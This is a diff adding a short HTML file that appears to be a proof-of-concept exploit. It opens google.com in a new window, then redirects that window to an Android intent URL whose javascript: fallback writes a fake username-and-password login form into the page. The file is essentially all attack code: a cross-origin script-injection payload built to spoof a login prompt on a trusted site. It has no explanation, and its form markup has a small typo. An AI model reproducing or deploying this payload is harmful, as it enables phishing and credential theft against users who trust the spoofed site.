@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset=utf-8>
+<body>
+<button id=btn>Run</button>
+<script>
+const js = 'document.write("h2>Login</h2><form><input type=text placeholder=Username><br><input type=password placeholder=Password><br><button>Login</button></form>")';
+const payload = 'intent://x#Intent;scheme=z;S.browser_fallback_url=javascript:'
+              + encodeURIComponent(js) + ';end';
+
+btn.onclick = () => {
+  const w = window.open('https://www.google.com/');
+  if (!w) return;
+  setTimeout(() => { w.location = payload; }, 100);
+};
+</script>
